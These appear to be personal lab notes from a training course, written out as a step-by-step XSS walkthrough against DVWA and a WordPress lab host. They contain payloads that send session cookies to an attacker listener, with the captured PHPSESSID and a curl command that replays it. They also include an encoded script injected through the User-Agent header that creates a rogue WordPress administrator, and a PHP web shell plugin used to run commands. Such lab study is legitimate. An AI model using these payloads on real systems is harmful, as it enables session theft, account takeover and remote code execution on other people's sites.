Reflected XSS:

1. Proof of Concept
<script>alert("hello world");</script>
or
http://dvwa.local/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22hello+world%22%29%3B%3C%2Fscript%3E#


2. Steal the target's PHP Session ID via XSS:
<img src=x onerror="new Image().src='http://192.168.48.128:8000/steal?c='+document.cookie">
or
http://dvwa.local/DVWA/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%22new+Image%28%29.src%3D%27http%3A%2F%2F192.168.48.128%3A8000%2Fsteal%3Fc%3D%27%2Bdocument.cookie%22%3E#

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8000
listening on [any] 8000 ...
connect to [192.168.48.128] from (UNKNOWN) [192.168.48.1] 61755
GET /steal?c=PHPSESSID=be6227281c27ad618bed6fd14894f887;%20security=low HTTP/1.1
Host: 192.168.48.128:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://dvwa.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


3. Use the PHP Session ID to Test Connection to the Web App:
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/"  
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 03:53:21 GMT
Server: Apache/2.4.63 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html;charset=utf-8

------------------------------------------------------------------------------------------------------------------------------------------------------------
Stored XSS:

<script>alert("Stored XSS!");</script>

Name: yo
Message: <script>alert("Stored XSS!");</script>

The message will display on the page whenever a user browses to it.

----------------------------------------------------------------------------------------------------------------------------------------------------------------
DOM-Based XSS:

http://dvwa.local/DVWA/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://dvwa.local/DVWA/vulnerabilities/xss_d/?default=English<script>alert(1)</script>

http://dvwa.local/DVWA/vulnerabilities/xss_d/?default=English'</option><script>new Image().src='http://192.168.48.128:8000/steal?c='+encodeURIComponent(document.cookie)</script><option value='English

----------------------------------------------------------------------------------------------------------------------------------------------------------------
Wordpress-Based XSS:

Once logged into the wordpress instance, open developer tools and go to the Storage Tab

Click on "http://offsecwp" under the Cookies menu on the left

Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be retrieved via JavaScript through our attack vector

Instead we will craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.

This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression:
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

To minify our attack code into a one-liner, we can navigate to https://jscompress.com

var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);

As a final attack step, we are going to encode the minified JavaScript code, so any bad characters won't interfere with sending the payload. We can do this using the following function:

function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)

Turn on Burp Intercept:
┌──(kali㉿kali)-[~]
└─$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080

After confirming the payload, forward the request and turn off Burp Intercept

Click on "Visitors"
┌──(kali㉿kali)-[~]
└─$ firefox http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php
We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into "<script>" tags, so the browser cannot render any string from it.

Click on "Users"
┌──(kali㉿kali)-[~]
└─$ firefox http://offsecwp/wp-admin/users.php

---

┌──(kali㉿kali)-[~]
└─$ cat oscp-shell.php
<?php

/**
* Plugin Name: Web Shell Plugin
* Plugin URI:
* Description: Web Shell Plugin
* Version: 1.0
* Author: Google
* Author URI: https://google.com/
*/

if(isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
                           
┌──(kali㉿kali)-[~]
└─$ zip oscp-shell.php.zip oscp-shell.php
  adding: oscp-shell.php (deflated 29%)
                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444 
listening on [any] 4444 ...

Log into the Wordpress Database:
┌──(kali㉿kali)-[~]
└─$ firefox http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php
     
Click "Plugins"
Click "Add New"
Click "Upload Plugin"
Click "Browse"
Attach the zip file     
Click "Install Now"                         
Unpacking the package…
Installing the plugin…
Plugin installed successfully.
Click "Activate Plugin" 
                                                    

Once the plugin is installed, we can confirm RCE:
┌──(kali㉿kali)-[~]
└─$ curl "http://offsecwp/wp-content/plugins/web_shell.php?cmd=ls" 
<pre>index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-docker.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
</pre> 


┌──(kali㉿kali)-[~]
└─$ curl "http://offsecwp/wp-content/plugins/web_shell.php?cmd=cat%20/tmp/flag"
<pre>OS{ab75687189be601f546565aee564460f}
</pre> 
